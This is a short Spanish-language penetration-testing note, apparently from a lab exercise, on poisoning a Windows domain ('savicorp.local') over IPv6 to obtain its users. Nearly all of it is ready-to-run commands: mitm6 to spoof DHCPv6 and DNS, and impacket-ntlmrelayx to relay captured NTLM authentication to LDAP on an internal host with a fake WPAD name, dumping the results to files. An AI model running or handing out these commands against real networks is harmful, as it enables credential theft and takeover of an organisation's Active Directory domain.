Aqui lo que haremos sera envenenar el dominio entero de la empresa pero por IPV6 para obtener los usuarios con la herramienta 

Las maquias Windows por defecto solicitan trafico ipv6

```
sudo mitm6 -d savicorp.local -i ens33

sudo mitm6 -d savicorp.local -i ens33 --domain savicorp.local

sudo mitm6 -d savicorp.local -i ens33 --verbose --ignore-nofqdn
```


```
sudo impacket-ntlmrelayx -6 -t ldap://10.10.11.130 -smb2support -wh pcfalsa.savicorp.local -l dumpedFiles
```